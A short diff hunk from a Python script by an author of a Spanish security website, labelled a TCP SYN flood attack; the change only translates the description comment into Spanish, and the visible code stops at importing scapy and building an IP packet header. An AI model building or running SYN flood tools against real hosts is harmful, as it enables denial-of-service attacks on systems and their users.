@@ -1,7 +1,7 @@
 #! /usr/bin/env python
 # Name : Antonio Taboada
 # Website : www.hackingyseguridad.com
-# Description : TCP SYN Flood attack
+# Description : Simple ataque de inundacion TCP SYN
 import sys
 from scapy.all import *
 ip=IP(dst="0.0.0.0",frag=0,ttl=64)
